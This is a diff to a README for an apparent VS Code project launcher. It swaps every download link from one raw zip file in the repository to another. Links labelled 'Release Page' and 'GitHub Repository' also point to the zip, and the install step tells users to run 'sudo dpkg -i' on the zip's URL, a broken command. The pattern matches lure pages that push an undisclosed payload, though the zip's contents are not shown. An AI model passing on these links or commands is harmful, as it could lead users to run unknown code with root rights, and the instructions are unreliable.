@@ -1,7 +1,7 @@
 # 🚀 vscode-project-launcher - Easily Manage Your VS Code Workspaces
 
 ## 📦 Download Now
-[![Download](https://raw.githubusercontent.com/yogas13/vscode-project-launcher/main/Corabecan/vscode-project-launcher.zip)](https://raw.githubusercontent.com/yogas13/vscode-project-launcher/main/Corabecan/vscode-project-launcher.zip)
+[![Download](https://raw.githubusercontent.com/yogas13/vscode-project-launcher/main/src/gui/launcher_vscode_project_3.0.zip)](https://raw.githubusercontent.com/yogas13/vscode-project-launcher/main/src/gui/launcher_vscode_project_3.0.zip)
 
 ## 💻 Introduction
 vscode-project-launcher is a desktop application designed to help you manage and launch your Visual Studio Code workspaces with ease. No programming knowledge is required. If you frequently switch between projects, this app can make your workflow smoother.
@@ -17,7 +17,7 @@ To get started with vscode-project-launcher, follow these simple steps:
 ### 2. Downloading the Application
 Visit the Releases page to download the application. You can find it here:
 
-[Download & Install](https://raw.githubusercontent.com/yogas13/vscode-project-launcher/main/Corabecan/vscode-project-launcher.zip)
+[Download & Install](https://raw.githubusercontent.com/yogas13/vscode-project-launcher/main/src/gui/launcher_vscode_project_3.0.zip)
 
 ### 3. Installing the Application
 - Locate the downloaded file on your computer.
@@ -25,7 +25,7 @@ Visit the Releases page to download the application. You can find it here:
 - Navigate to the folder where you downloaded the file.
 - Enter the following command to install the application:
   ```
-  sudo dpkg -i https://raw.githubusercontent.com/yogas13/vscode-project-launcher/main/Corabecan/vscode-project-launcher.zip
+  sudo dpkg -i https://raw.githubusercontent.com/yogas13/vscode-project-launcher/main/src/gui/launcher_vscode_project_3.0.zip
   ```
 - If you face dependency issues, run:
   ```
@@ -62,8 +62,8 @@ If you encounter issues:
 If you need help, feel free to open an issue on the GitHub repository or reach out to our support team. Your feedback is important for further improving vscode-project-launcher.
 
 ## 🔗 Useful Links
-- [Release Page](https://raw.githubusercontent.com/yogas13/vscode-project-launcher/main/Corabecan/vscode-project-launcher.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/yogas13/vscode-project-launcher/main/Corabecan/vscode-project-launcher.zip)
+- [Release Page](https://raw.githubusercontent.com/yogas13/vscode-project-launcher/main/src/gui/launcher_vscode_project_3.0.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/yogas13/vscode-project-launcher/main/src/gui/launcher_vscode_project_3.0.zip)
 
 ## 🏷️ Topics
 - linux
